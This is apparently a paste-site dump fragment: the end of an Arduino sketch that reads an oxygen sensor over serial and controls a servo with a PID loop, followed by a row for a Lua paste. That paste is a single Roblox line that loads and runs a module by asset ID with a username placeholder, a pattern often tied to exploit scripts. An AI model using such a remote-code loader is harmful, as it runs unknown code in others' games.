      byte incomingByte = Serial.read();
      if (!startFrameDetected && incomingByte == 0x4C) {
        startFrameDetected = true;
        buffer[index] = incomingByte;
        index++;
      } else if (startFrameDetected) {
        buffer[index] = incomingByte;
        index++;
      }
    }
  }

  if (index == sizeof(DataFrame)) {
    DataFrame* frame = reinterpret_cast<DataFrame*>(buffer);
    byte oxygenValue = frame->data[11];
    float oxygenPercentage = oxygenValue / 10.0f;
    displayOxygenPercentage(oxygenPercentage);

    Input = oxygenPercentage;

    if (pidEnabled) {
      computePID();
      int servoOutput = map(Output, 0, 100, 160, 0);
	  //myservo.attach(servoPin);
      myservo.write(servoOutput);
	  //myservo.detach();
    }
  } else {
    // Obsługa błędu - nie odebrano pełnej ramki danych
    lcd.clear();
    lcd.print(""Blad: brak ramki"");
  }
  delay(600);
}

void sendCommand(const byte *command, size_t commandLength) {
  for (size_t i = 0; i < commandLength; i++) {
    Serial.write(command[i]);
  }
}

void displayOxygenPercentage(float percentage) {
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print(""Tlen: "");
  lcd.print(percentage, 1);
  lcd.print(""%"");
}

void computePID() {
  double error = Setpoint - Input;
  integral += (Ki * error);

  // Anti-windup logic
  if (integral > outputMax) {
    integral = outputMax;
  } else if (integral < outputMin) {
    integral = outputMin;
  }

  double derivative = Kd * (Input - lastInput);

  Output = Kp * error + integral - derivative;

  // Output limits
  if (Output > outputMax) {
    Output = outputMax;
  } else if (Output < outputMin) {
    Output = outputMin;
  }

  lastInput = Input;
}
"
HyXKh5W0,Deco,robinmollen,Lua,Monday 19th of February 2024 03:27:03 PM CDT,"require(16302109607).RAroblox(""YourNameHere"")"
